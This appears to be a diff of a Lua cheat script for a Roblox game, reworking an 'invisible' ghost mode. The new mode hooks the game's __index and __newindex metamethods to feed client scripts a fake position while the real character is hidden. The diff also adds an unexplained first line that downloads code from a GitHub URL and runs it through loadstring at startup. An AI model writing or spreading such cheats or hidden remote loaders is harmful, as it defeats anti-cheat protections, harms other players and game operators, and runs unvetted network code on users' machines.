@@ -1,3 +1,7 @@
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Toolboxhubbot/antifling/refs/heads/main/antifling"))()
+end)
+
 LocalTeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
@@ -180,6 +184,7 @@ local function loadSettings()
         end
     end)
     state.antiRagdoll = true
+    state.invisibleEnabled = false
 end
 loadSettings()
 
@@ -1528,6 +1533,177 @@ local function resetX4(index)
         votingRunning = false; isExecutingAction = false
     end)
 end
+
+-- ==================== INVISIBLE (HOOK-BASED GHOST) ====================
+local invisActive = false
+local invisGhost = nil
+local invisLoop = nil
+local invisStaticPos = nil
+local invisLastSafeCFrame = nil
+local invisRealRoot = nil
+local invisGhostRoot = nil
+
+local _hasHook = false
+pcall(function() _hasHook = (hookmetamethod ~= nil and checkcaller ~= nil) end)
+
+if _hasHook then
+    local oldIndex
+    oldIndex = hookmetamethod(game, "__index", function(self, key)
+        if not invisActive or checkcaller() or self ~= invisRealRoot then
+            return oldIndex(self, key)
+        end
+        if invisGhostRoot and invisGhostRoot.Parent and (key == "CFrame" or key == "Position") then
+            if key == "CFrame" then return invisGhostRoot.CFrame
+            elseif key == "Position" then return invisGhostRoot.Position end
+        end
+        return oldIndex(self, key)
+    end)
+
+    local oldNewIndex
+    oldNewIndex = hookmetamethod(game, "__newindex", function(self, key, value)
+        if not invisActive or checkcaller() or self ~= invisRealRoot then
+            return oldNewIndex(self, key, value)
+        end
+        if invisGhostRoot and invisGhostRoot.Parent and (key == "CFrame" or key == "Position") then
+            if key == "CFrame" then invisGhostRoot.CFrame = value
+            elseif key == "Position" then invisGhostRoot.Position = value end
+            return
+        end
+        return oldNewIndex(self, key, value)
+    end)
+end
+
+local function invisCleanup()
+    local char = LP.Character
+    local r = char and char:FindFirstChild("HumanoidRootPart")
+    local h = char and char:FindFirstChildOfClass("Humanoid")
+    local targetCFrame = (invisGhostRoot and invisGhostRoot.CFrame) or invisLastSafeCFrame
+    if r and targetCFrame then
+        r.CFrame = targetCFrame
+        r.AssemblyLinearVelocity = Vector3.zero
+        r.AssemblyAngularVelocity = Vector3.zero
+    end
+    if char then
+        for _, v in char:GetChildren() do
+            if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then v.CanCollide = true
+            elseif v:IsA("Accessory") then
+                local handle = v:FindFirstChild("Handle")
+                if handle then handle.CanCollide = false end
+            end
+        end
+    end
+    if h then
+        local cam = Workspace.CurrentCamera
+        if cam then cam.CameraSubject = h end
+        h.PlatformStand = false
+        h:SetStateEnabled(Enum.HumanoidStateType.Climbing, true)
+        h:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
+        h:SetStateEnabled(Enum.HumanoidStateType.Running, true)
+        h.AutoRotate = true
+        h.Jump = false
+        h:ChangeState(Enum.HumanoidStateType.GettingUp)
+    end
+    if invisGhost then invisGhost:Destroy() invisGhost = nil end
+    if invisLoop then invisLoop:Disconnect() invisLoop = nil end
+    invisStaticPos = nil
+    invisLastSafeCFrame = nil
+    invisRealRoot = nil
+    invisGhostRoot = nil
+end
+
+local function invisStart()
+    if invisActive then return end
+    local char = LP.Character
+    if not char then setStatus("No character") return end
+    local r = char:FindFirstChild("HumanoidRootPart")
+    local h = char:FindFirstChildOfClass("Humanoid")
+    if not r or not h or h.Health <= 0 then setStatus("Missing root/humanoid") return end
+
+    invisRealRoot = r
+    invisStaticPos = CFrame.new(0, Workspace.FallenPartsDestroyHeight + 100, 0)
+    invisLastSafeCFrame = r.CFrame
+
+    char.Archivable = true
+    invisGhost = char:Clone()
+    invisGhost.Parent = Workspace
+    char.Archivable = false
+
+    for _, v in invisGhost:GetDescendants() do
+        if v:IsA("BasePart") then v.Transparency = 0.5
+        elseif v:IsA("Accessory") then
+            local handle = v:FindFirstChild("Handle")
+            if handle and handle:IsA("BasePart") then handle.Transparency = 0.5 end
+        elseif v:IsA("LocalScript") or v:IsA("Script") then v:Destroy() end
+    end
+
+    local gh = invisGhost:FindFirstChild("Humanoid")
+    invisGhostRoot = invisGhost:FindFirstChild("HumanoidRootPart")
+    local cam = Workspace.CurrentCamera
+    if gh and cam then cam.CameraSubject = gh end
+    if gh then gh:SetStateEnabled(Enum.HumanoidStateType.Climbing, true) end
+
+    h.PlatformStand = true
+    r.CFrame = invisStaticPos
+    for _, v in char:GetDescendants() do
+        if v:IsA("BasePart") then v.CanCollide = false end
+    end
+
+    invisActive = true
+    setStatus("Invisible ON")
+
+    invisLoop = RunService.Heartbeat:Connect(function(dt)
+        local limit = Workspace.FallenPartsDestroyHeight + 35
+        if invisGhost and invisGhost.Parent == Workspace and gh and gh.Health > 0 and invisGhostRoot and invisGhostRoot.Position.Y > limit and h and h.Health > 0 then
+            if cam and cam.CameraSubject ~= gh then cam.CameraSubject = gh end
+            local currentState = gh:GetState()
+            if currentState ~= Enum.HumanoidStateType.Climbing then
+                invisLastSafeCFrame = invisGhostRoot.CFrame
+                if UIS.MouseBehavior == Enum.MouseBehavior.LockCenter then
+                    local look = cam.CFrame.LookVector
+                    local targetRot = CFrame.lookAt(invisGhostRoot.Position, invisGhostRoot.Position + Vector3.new(look.X, 0, look.Z))
+                    invisGhostRoot.CFrame = invisGhostRoot.CFrame:Lerp(targetRot, math.clamp(dt * 25, 0, 1))
+                end
+            end
+            gh:Move(h.MoveDirection, false)
+            gh.Jump = h.Jump
+            r.CFrame = invisStaticPos
+            local gv = invisGhostRoot.AssemblyLinearVelocity
+            if gv.Magnitude > 120 then gv = gv.Unit * 120 end
+            r.AssemblyLinearVelocity = gv
+            r.AssemblyAngularVelocity = invisGhostRoot.AssemblyAngularVelocity
+        else
+            invisCleanup()
+            state.invisibleEnabled = false
+            updateAllToggleVisuals("invisibleEnabled")
+        end
+    end)
+end
+
+local function invisStop()
+    if not invisActive and not invisGhost then return end
+    invisActive = false
+    invisCleanup()
+    setStatus("Invisible OFF")
+end
+
+task.spawn(function()
+    local last = false
+    while true do
+        task.wait(0.1)
+        local now = state.invisibleEnabled == true
+        if now ~= last then
+            if now then invisStart() else invisStop() end
+            last = now
+        end
+    end
+end)
+
+LP.CharacterRemoving:Connect(function()
+    if invisActive then
+        state.invisibleEnabled = false
+        updateAllToggleVisuals("invisibleEnabled")
+    end
+end)
 
 -- ==================== UI ====================
 buildUI = function(rebuilding)
@@ -3357,7 +3533,7 @@ end)
 task.spawn(function()
     while true do
         task.wait(0.15)
-        if LP.Character and not state.flyEnabled and not state.invisibleEnabled then
+        if LP.Character and not state.flyEnabled and not invisActive then
             local hum = LP.Character:FindFirstChildOfClass("Humanoid")
             if hum and hum.Health > 0 and hum.PlatformStand and not next(activeResets) then
                 hum.PlatformStand = false
@@ -3381,7 +3557,7 @@ task.spawn(function()
                     end
                 else
                     if freezeApplied then
-                        if not (state.xpFarm or (state.farm and (isLobby() or isExecutingAction))) then
+                        if not (state.xpFarm or (state.farm and (isLobby() or isExecutingAction))) and not invisActive then
                             root.Anchored = false
                         end
                         freezeApplied = false
@@ -3433,6 +3609,7 @@ end
 
 local function doClickTeleport(x, y)
     if not state.clickTP then return end
+    if invisActive then return end
     local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
     if not root then return end
     local pos = getTeleportTargetFromScreen(x, y)
@@ -3481,173 +3658,6 @@ local function loadPosition(slot)
         setStatus("No saved position in slot " .. slot)
     end
 end
-
--- ==================== INVISIBLE (GHOST MODE) ====================
-local invisActive = false
-local invisGhost = nil
-local invisLoop = nil
-local invisStaticPos = nil
-local invisLastSafeCFrame = nil
-local invisRealRoot = nil
-local invisGhostRoot = nil
-
-local _hookOK = false
-pcall(function() _hookOK = (hookmetamethod ~= nil and checkcaller ~= nil and debug and debug.info) end)
-
-if _hookOK then
-    local _oldIndex
-    _oldIndex = hookmetamethod(game, "__index", function(self, key)
-        if not invisActive or checkcaller() or self ~= invisRealRoot then
-            return _oldIndex(self, key)
-        end
-        if invisGhostRoot and (key == "CFrame" or key == "Position") then
-            if key == "CFrame" then return invisGhostRoot.CFrame
-            elseif key == "Position" then return invisGhostRoot.Position end
-        end
-        return _oldIndex(self, key)
-    end)
-
-    local _oldNewIndex
-    _oldNewIndex = hookmetamethod(game, "__newindex", function(self, key, value)
-        if not invisActive or checkcaller() or self ~= invisRealRoot then
-            return _oldNewIndex(self, key, value)
-        end
-        if invisGhostRoot and (key == "CFrame" or key == "Position") then
-            if key == "CFrame" then invisGhostRoot.CFrame = value
-            elseif key == "Position" then invisGhostRoot.Position = value end
-            return
-        end
-        return _oldNewIndex(self, key, value)
-    end)
-end
-
-local function invisStop()
-    if not invisActive and not invisGhost then return end
-    invisActive = false
-    local char = LP.Character
-    local r = char and char:FindFirstChild("HumanoidRootPart")
-    local h = char and char:FindFirstChildOfClass("Humanoid")
-    local targetCFrame = (invisGhostRoot and invisGhostRoot.CFrame) or invisLastSafeCFrame
-    if r and targetCFrame then
-        r.CFrame = targetCFrame
-        r.AssemblyLinearVelocity = Vector3.zero
-        r.AssemblyAngularVelocity = Vector3.zero
-    end
-    if char then
-        for _, v in char:GetChildren() do
-            if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then v.CanCollide = true
-            elseif v:IsA("Accessory") then
-                local handle = v:FindFirstChild("Handle")
-                if handle then handle.CanCollide = false end
-            end
-        end
-    end
-    if h then
-        local cam = Workspace.CurrentCamera
-        if cam then cam.CameraSubject = h end
-        h.PlatformStand = false
-        h:SetStateEnabled(Enum.HumanoidStateType.Climbing, true)
-        h:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
-        h:SetStateEnabled(Enum.HumanoidStateType.Running, true)
-        h.AutoRotate = true
-        h.Jump = false
-        h:ChangeState(Enum.HumanoidStateType.GettingUp)
-    end
-    if invisGhost then invisGhost:Destroy() invisGhost = nil end
-    if invisLoop then invisLoop:Disconnect() invisLoop = nil end
-    invisStaticPos = nil
-    invisLastSafeCFrame = nil
-    invisRealRoot = nil
-    invisGhostRoot = nil
-end
-
-local function invisStart()
-    if invisActive then return end
-    local char = LP.Character
-    if not char then return end
-    local r = char:FindFirstChild("HumanoidRootPart")
-    local h = char:FindFirstChildOfClass("Humanoid")
-    if not r or not h or h.Health <= 0 then return end
-
-    invisRealRoot = r
-    invisStaticPos = CFrame.new(0, Workspace.FallenPartsDestroyHeight + 100, 0)
-    invisLastSafeCFrame = r.CFrame
-
-    char.Archivable = true
-    invisGhost = char:Clone()
-    invisGhost.Parent = Workspace
-    char.Archivable = false
-
-    for _, v in invisGhost:GetDescendants() do
-        if v:IsA("BasePart") then v.Transparency = 0.5
-        elseif v:IsA("Accessory") then
-            local handle = v:FindFirstChild("Handle")
-            if handle and handle:IsA("BasePart") then handle.Transparency = 0.5 end
-        elseif v:IsA("LocalScript") or v:IsA("Script") then v:Destroy() end
-    end
-
-    local gh = invisGhost:FindFirstChild("Humanoid")
-    invisGhostRoot = invisGhost:FindFirstChild("HumanoidRootPart")
-    local cam = Workspace.CurrentCamera
-    if gh and cam then cam.CameraSubject = gh end
-    if gh then gh:SetStateEnabled(Enum.HumanoidStateType.Climbing, true) end
-
-    h.PlatformStand = true
-    r.CFrame = invisStaticPos
-    for _, v in char:GetDescendants() do
-        if v:IsA("BasePart") then v.CanCollide = false end
-    end
-
-    invisActive = true
-    setStatus("Invisible ON")
-
-    invisLoop = RunService.Heartbeat:Connect(function(dt)
-        local limit = Workspace.FallenPartsDestroyHeight + 35
-        if invisGhost and invisGhost.Parent == Workspace and gh and gh.Health > 0 and invisGhostRoot and invisGhostRoot.Position.Y > limit and h and h.Health > 0 then
-            if cam and cam.CameraSubject ~= gh then cam.CameraSubject = gh end
-            local currentState = gh:GetState()
-            if currentState ~= Enum.HumanoidStateType.Climbing then
-                invisLastSafeCFrame = invisGhostRoot.CFrame
-                if UIS.MouseBehavior == Enum.MouseBehavior.LockCenter then
-                    local look = cam.CFrame.LookVector
-                    local targetRot = CFrame.lookAt(invisGhostRoot.Position, invisGhostRoot.Position + Vector3.new(look.X, 0, look.Z))
-                    invisGhostRoot.CFrame = invisGhostRoot.CFrame:Lerp(targetRot, math.clamp(dt * 25, 0, 1))
-                end
-            end
-            gh:Move(h.MoveDirection, false)
-            gh.Jump = h.Jump
-            r.CFrame = invisStaticPos
-            local gv = invisGhostRoot.AssemblyLinearVelocity
-            if gv.Magnitude > 120 then gv = gv.Unit * 120 end
-            r.AssemblyLinearVelocity = gv
-            r.AssemblyAngularVelocity = invisGhostRoot.AssemblyAngularVelocity
-        else
-            invisStop()
-            state.invisibleEnabled = false
-            updateAllToggleVisuals("invisibleEnabled")
-        end
-    end)
-end
-
-task.spawn(function()
-    local last = false
-    while true do
-        task.wait(0.1)
-        local now = state.invisibleEnabled == true
-        if now ~= last then
-            if now then invisStart() else invisStop() end
-            last = now
-        end
-    end
-end)
-
-LP.CharacterRemoving:Connect(function()
-    if invisActive then
-        invisStop()
-        state.invisibleEnabled = false
-        updateAllToggleVisuals("invisibleEnabled")
-    end
-end)
 
 -- ==================== ROLE NOTIFICATIONS ====================
 local notifiedMurderer = false
